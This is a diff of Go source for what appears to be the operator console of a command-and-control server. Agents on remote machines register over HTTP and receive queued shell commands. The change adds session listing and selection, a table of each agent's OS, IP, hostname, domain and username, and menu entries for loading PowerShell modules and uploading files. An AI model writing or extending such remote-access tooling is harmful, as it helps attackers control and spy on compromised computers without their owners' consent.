@@ -14,20 +14,26 @@ import (
 	"strings"
 	"time"
 
-	"github.com/axgle/mahonia" //中文编码
-	"github.com/c-bata/go-prompt"  // 增加tab 下拉菜单
+	"github.com/AlecAivazis/survey"
+	"github.com/axgle/mahonia"    //中文编码
+	"github.com/c-bata/go-prompt" // 增加tab 下拉菜单
+	"github.com/fatih/color"
 	"github.com/olekukonko/tablewriter" //表格
 )
 
 const help_shell = `
 		help   帮助参数
    		info   列出操作系统参数
+        load   加载Moudle下的ps1 文件
+        upload 上传文件
 		back   返回主页
 	 `
 const help = `
-		help   帮助参数
-   		shell  进入shell
-		back   返回主页
+		help          帮助参数
+		Sessions list 显示会话信息包括会话id
+		Sessions id   以会话的形式接管shell
+   		shell  		进入shell
+		exit          退出
 	 `
 
 var (
@@ -35,6 +41,8 @@ var (
 	cmd                                      string = ""
 	AGENTS                                   map[string]string
 	info                                     string = ""
+	session_id                               string
+	ID                                       string = ""
 	//全局变量
 )
 
@@ -68,11 +76,14 @@ func sayhelloName(w http.ResponseWriter, r *http.Request) {
 		url_path, _ := regexp.Compile(`[A-Z]+`)
 		id := url_path.FindString(r.URL.Path)
 		AGENTS[id] = "ok"
+		ID = id
+		fmt.Println(data)
 
 		//md执行命令
 	} else if url_cm.MatchString(r.URL.Path) {
 		url_path, _ := regexp.Compile(`[A-Z]+`)
 		var id = url_path.FindString(r.URL.Path)
+		fmt.Println(id)
 		_, ok := AGENTS[id]
 		if ok {
 			if cmd != "" {
@@ -222,11 +233,11 @@ func info_os() { //定义表格  info信息
 	username = info[5]
 	//定义 info 信息中的变量
 	data := [][]string{
-		[]string{OS, IP, Arch, hostname, domain, username},
+		[]string{ID, OS, IP, Arch, hostname, domain, username},
 	}
 	//将info信息做成表格
 	table := tablewriter.NewWriter(os.Stdout)
-	table.SetHeader([]string{"操作系统版本", "IP地址", "x86 OR x64", "主机名", "域名", "用户名"})
+	table.SetHeader([]string{"ID", "操作系统版本", "IP地址", "x86 OR x64", "主机名", "域名", "用户名"})
 
 	for _, v := range data {
 		table.Append(v)
@@ -277,11 +288,27 @@ func completer(in prompt.Document) []prompt.Suggest { //一级菜单栏列表
 	s := []prompt.Suggest{
 		{Text: "shell"},
 		{Text: "help"},
+		{Text: "session list"},
+		{Text: "Interact", Description: "Interact with AGENT"},
 		{Text: "exit"},
 	}
 	return prompt.FilterHasPrefix(s, in.GetWordBeforeCursor(), true)
 }
+func Session_id() {
+	Blue := color.New(color.FgBlue).SprintFunc() //颜色设定 https://github.com/fatih/color
+	session_id = ""
+	prompt := &survey.Input{
+		Message: "Interact id ",
+	}
 
+	survey.AskOne(prompt, &session_id, survey.WithIcons(func(icons *survey.IconSet) {
+
+		icons.Question.Text = "メ "
+		icons.Question.Format = "red+hb"
+
+	}))
+	fmt.Printf("%s setting Interact session id => %s.\n", Blue("[*]"), session_id) //https://github.com/fatih/color
+}
 func Options() { //定义tab 下拉菜单选项参数
 	for true {
 		options := prompt.Input("SSF >", completer,
@@ -289,16 +316,21 @@ func Options() { //定义tab 下拉菜单选项参数
 			prompt.OptionPreviewSuggestionTextColor(prompt.Black),    //下拉菜单的字体
 			prompt.OptionSelectedSuggestionBGColor(prompt.LightGray), //下拉菜单的字背景
 			prompt.OptionSuggestionBGColor(prompt.DarkGray))          //菜单框背景
+
 		switch {
+
 		case options == "shell":
 			for true {
-
 				fmt.Print("Console_shell >")
 				Scanf(&cmd)
 
 			}
 		case options == "help":
 			fmt.Println(help)
+		case options == "Interact":
+			Session_id()
+		case options == "session list":
+			info_os()
 		case options == "exit":
 			os.Exit(0)
 			break
